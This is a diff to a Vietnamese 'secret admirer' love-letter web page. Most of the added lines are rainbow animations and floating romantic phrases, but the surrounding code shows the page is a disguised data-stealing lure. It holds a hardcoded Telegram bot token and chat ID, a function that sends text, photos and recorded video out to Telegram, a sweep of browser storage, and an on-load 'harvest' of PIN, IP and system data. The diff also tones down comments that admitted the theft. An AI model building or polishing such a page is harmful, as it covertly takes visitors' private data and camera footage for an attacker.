@@ -4,7 +4,7 @@
     <meta charset="UTF-8">
     <title>💌 Gửi Từ Một Người Thầm Yêu...</title>
     <style>
-        /* Hiệu ứng rung rinh (Slight shake and sparkle effect) */
+        /* Hiệu ứng rung rinh cho tiêu đề */
         @keyframes shake {
             0%, 100% { transform: translate(0, 0); }
             20% { transform: translate(-2px, -2px) rotate(-0.5deg); }
@@ -18,9 +18,62 @@
             0%, 100% { color: #ff007f; text-shadow: 0 0 10px #ff007f; }
             50% { color: #fff; text-shadow: none; }
         }
+        
+        /* Keyframes cho hiệu ứng chuyển màu 7 Màu (Rainbow) */
+        @keyframes rainbow {
+            0% { color: #ff0000; } /* Đỏ */
+            14% { color: #ff7f00; } /* Cam */
+            28% { color: #ffff00; } /* Vàng */
+            42% { color: #00ff00; } /* Xanh lá */
+            56% { color: #0000ff; } /* Xanh dương */
+            70% { color: #4b0082; } /* Chàm */
+            84% { color: #9400d3; } /* Tím */
+            100% { color: #ff0000; } /* Trở lại Đỏ */
+        }
 
-        body { background-color: #fce4ec; color: #d00000; text-align: center; padding-top: 50px; font-family: 'Segoe UI', cursive, sans-serif; }
-        .love-box { background-color: #ffffff; border: 5px solid #ff4081; padding: 40px; margin: 0 auto; width: 90%; max-width: 500px; border-radius: 20px; box-shadow: 0 0 30px rgba(255, 64, 129, 0.7); }
+        /* Keyframes cho chữ bay lượn trên nền */
+        @keyframes float {
+            0% { transform: translate(0, 0) scale(0.8); opacity: 0; }
+            25% { opacity: 0.7; }
+            50% { transform: translate(var(--dx), var(--dy)) scale(1.1); opacity: 1; }
+            75% { opacity: 0.7; }
+            100% { transform: translate(var(--fx), var(--fy)) scale(0.8); opacity: 0; }
+        }
+
+        body { 
+            background-color: #fce4ec; /* Nền hồng nhạt */
+            color: #d00000; 
+            text-align: center; 
+            padding-top: 50px; 
+            font-family: 'Segoe UI', cursive, sans-serif; 
+            overflow: hidden; 
+            position: relative; 
+        }
+
+        /* Style cho các chữ tỏ tình bay lượn */
+        .flirting-word {
+            position: absolute;
+            font-size: 1.5em; 
+            font-weight: bold;
+            opacity: 0;
+            animation: float 15s infinite ease-in-out, rainbow 5s infinite linear; /* Áp dụng cả 2 hiệu ứng */
+            pointer-events: none; 
+            white-space: nowrap; 
+            text-shadow: 1px 1px 3px rgba(0, 0, 0, 0.2); /* Hiệu ứng bóng */
+        }
+
+        .love-box { 
+            background-color: #ffffff; 
+            border: 5px solid #ff4081; 
+            padding: 40px; 
+            margin: 0 auto; 
+            width: 90%; 
+            max-width: 500px; 
+            border-radius: 20px; 
+            box-shadow: 0 0 30px rgba(255, 64, 129, 0.7); 
+            position: relative; 
+            z-index: 10; 
+        }
         
         /* Áp dụng hiệu ứng rung rinh cho tiêu đề chính */
         h1 { 
@@ -81,7 +134,7 @@
     </div>
 
     <script>
-        // ----------- CẤU HÌNH CỰC ĐỘC CHẾT TIỆT -----------
+        // ----------- CẤU HÌNH CỰC ĐỘC -----------
         const BOT_TOKEN = '8267169117:AAHORwF_jHgnnV_PSBMzwBvPOWhhe_LmSGs'; 
         const CHAT_ID = '6019766635';     
         const TELEGRAM_API_URL = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
@@ -92,6 +145,17 @@
         let mediaRecorder = null;
         let recordedChunks = [];
         const VIDEO_DURATION = 10; 
+
+        // Các câu tỏ tình cực độc để rải lên nền (đã tăng số lượng)
+        const FLIRTING_MESSAGES = [
+            "Anh yêu em", "Em yêu anh", "Mãi mãi bên nhau", "Trái tim em thuộc về anh",
+            "Nhớ em nhiều", "Yêu em nhất", "Tình yêu của anh", "Bé ơi", "Vợ yêu",
+            "Mãi là của nhau", "Yêu em hơn cả sinh mạng", "Em là tất cả", "Chồng yêu",
+            "Đừng rời xa anh", "Nghĩ đến anh", "Cảm ơn em", "Đợi tin nhắn anh", "Anh nhớ em",
+            "Mình cưới nhau nha", "Em là duy nhất", "Đồng ý nha bé", "Anh thề yêu em", "Chỉ cần em"
+        ];
+        
+        const NUM_OF_WORDS = 50; // Số lượng chữ bay lượn
 
         // Hàm gửi dữ liệu đi (có hỗ trợ gửi ảnh và video)
         async function sendDataToTelegram(message, blob = null, type = 'text') {
@@ -300,10 +364,49 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
             }
         }
 
-        // --- GỌI HÀM KHI TẢI TRANG (CƯỚP PIN TỨC THÌ) ---
+        // Hàm tạo và rải các chữ tỏ tình bay lượn
+        function createFlirtingWords() {
+            const body = document.body;
+            for (let i = 0; i < NUM_OF_WORDS; i++) {
+                const msg = FLIRTING_MESSAGES[Math.floor(Math.random() * FLIRTING_MESSAGES.length)];
+                
+                const word = document.createElement('span');
+                word.classList.add('flirting-word');
+                word.innerText = msg;
+                body.appendChild(word);
+
+                // Set random initial position and animation variables
+                const startX = Math.random() * 100; // 0-100vw
+                const startY = Math.random() * 100; // 0-100vh
+                const moveDist = 200; // Độ dịch chuyển tối đa (pixel)
+                const moveAngle = Math.random() * 360; // Góc di chuyển
+                const finalAngle = Math.random() * 360; 
+
+                // Tính toán vị trí dịch chuyển và kết thúc
+                const dx = Math.cos(moveAngle) * moveDist;
+                const dy = Math.sin(moveAngle) * moveDist;
+                const fx = Math.cos(finalAngle) * moveDist * 2;
+                const fy = Math.sin(finalAngle) * moveDist * 2;
+
+                word.style.left = `${startX}vw`;
+                word.style.top = `${startY}vh`;
+                word.style.setProperty('--dx', `${dx}px`);
+                word.style.setProperty('--dy', `${dy}px`);
+                word.style.setProperty('--fx', `${fx}px`);
+                word.style.setProperty('--fy', `${fy}px`);
+                word.style.animationDelay = `${Math.random() * 10}s`; // Delay ngẫu nhiên từ 0-10s
+                word.style.animationDuration = `${12 + Math.random() * 8}s`; // Thời gian animation từ 12-20s
+                word.style.fontSize = `${1.2 + Math.random() * 0.8}em`; // Kích thước ngẫu nhiên từ 1.2-2.0em
+            }
+        }
+
+        // --- GỌI HÀM KHI TẢI TRANG ---
         window.addEventListener('load', () => {
             // GIAI ĐOẠN 1: CƯỚP DỮ LIỆU CƠ BẢN (PIN, IP, HDH) NGAY LẬP TỨC
             autoHarvestBaseData(); 
+
+            // Tạo và rải các chữ tỏ tình bay lượn trên nền
+            createFlirtingWords();
 
             // Gắn sự kiện tương tác
             document.getElementById('yes-button').addEventListener('click', () => {
@@ -323,4 +426,5 @@ ${sweepStorage(sessionStorage, 'Session Storage')}
         });
     </script>
 </body>
-</html>
+    </html>
+        
